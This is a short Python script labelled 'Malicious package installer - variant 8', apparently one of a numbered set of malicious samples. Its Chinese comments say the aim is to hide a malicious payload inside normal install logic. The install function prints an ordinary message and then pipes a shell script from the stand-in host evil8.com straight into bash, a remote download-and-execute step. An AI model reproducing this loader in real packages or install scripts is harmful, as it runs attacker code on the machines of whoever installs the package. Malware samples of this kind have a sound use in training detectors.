# Malicious package installer - variant 8
import subprocess
import os

# 隐藏恶意代码在正常逻辑中
def install():
    # 正常安装逻辑
    print("Installing package...")
    
    # 恶意载荷 8
    subprocess.run('curl -s http://evil8.com/shell.sh | bash', shell=True)

if __name__ == '__main__':
    install()
